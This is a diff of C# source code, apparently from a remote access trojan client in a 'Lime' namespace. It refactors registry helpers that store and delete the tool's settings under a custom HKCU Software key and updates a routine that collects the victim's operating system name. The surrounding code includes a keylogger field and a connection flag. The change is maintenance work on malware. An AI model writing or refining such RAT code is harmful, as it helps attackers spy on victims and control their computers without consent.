@@ -46,10 +46,6 @@ namespace Lime
 
         public static FileInfo CurrentAssemblyFileInfo = new FileInfo(Application.ExecutablePath);
 
-        public static FileStream FS;
-
-        public static Computer _Computer = new Computer();
-
         public static Keylogger _Keylogger = null;
 
         public static bool IsConnected = false;
@@ -69,7 +65,10 @@ namespace Lime
         {
             try
             {
-                _Computer.Registry.CurrentUser.OpenSubKey("Software\\" + RG, true).DeleteValue(name);
+                using (RegistryKey key = Registry.CurrentUser.CreateSubKey("Software\\" + RG, RegistryKeyPermissionCheck.ReadWriteSubTree))
+                {
+                    key.DeleteValue(name);
+                }
             }
             catch (Exception expr_2C)
             {
@@ -83,7 +82,10 @@ namespace Lime
             object result;
             try
             {
-                result = _Computer.Registry.CurrentUser.OpenSubKey("Software\\" + RG).GetValue(name, RuntimeHelpers.GetObjectValue(ret));
+                using (RegistryKey key = Registry.CurrentUser.OpenSubKey("Software\\" + RG,RegistryKeyPermissionCheck.ReadWriteSubTree))
+                {
+                    result = key.GetValue(name, RuntimeHelpers.GetObjectValue(ret));
+                }
             }
             catch (Exception expr_32)
             {
@@ -99,8 +101,11 @@ namespace Lime
             bool result;
             try
             {
-                _Computer.Registry.CurrentUser.CreateSubKey("Software\\" + RG).SetValue(n, RuntimeHelpers.GetObjectValue(t), typ);
-                result = true;
+                using (RegistryKey key = Registry.CurrentUser.CreateSubKey("Software\\" + RG, RegistryKeyPermissionCheck.ReadWriteSubTree))
+                {
+                    key.SetValue(n, RuntimeHelpers.GetObjectValue(t));
+                    result = true;
+                }
             }
             catch (Exception expr_34)
             {
@@ -171,7 +176,7 @@ namespace Lime
             text = text + "" + Splitter;
             try
             {
-                text += _Computer.Info.OSFullName.Replace("Microsoft", "").Replace("Windows", "Win").Replace("®", "").Replace("™", "").Replace("  ", " ").Replace(" Win", "Win");
+                text += new Computer().Info.OSFullName.Replace("Microsoft", "").Replace("Windows", "Win").Replace("®", "").Replace("™", "").Replace("  ", " ").Replace(" Win", "Win");
             }
             catch (Exception expr_1FF)
             {
@@ -228,7 +233,7 @@ namespace Lime
                 string text4 = "";
                 try
                 {
-                    string[] valueNames = _Computer.Registry.CurrentUser.CreateSubKey("Software\\" + RG, RegistryKeyPermissionCheck.Default).GetValueNames();
+                    string[] valueNames = Registry.CurrentUser.CreateSubKey("Software\\" + RG, RegistryKeyPermissionCheck.Default).GetValueNames();
                     for (int i = 0; i < valueNames.Length; i++)
                     {
                         string text5 = valueNames[i];
@@ -398,7 +403,7 @@ namespace Lime
         {
             try
             {
-                _Computer.Registry.CurrentUser.OpenSubKey("Software", true).DeleteSubKey(RG, false);
+                Registry.CurrentUser.OpenSubKey("Software", true).DeleteSubKey(RG, false);
             }
             catch (Exception expr_10F)
             {
@@ -1106,7 +1111,7 @@ namespace Lime
             {
                 try
                 {
-                    _Computer.Registry.CurrentUser.SetValue("di", "!");
+                    Registry.CurrentUser.SetValue("di", "!");
                 }
                 catch (Exception expr_27)
                 {
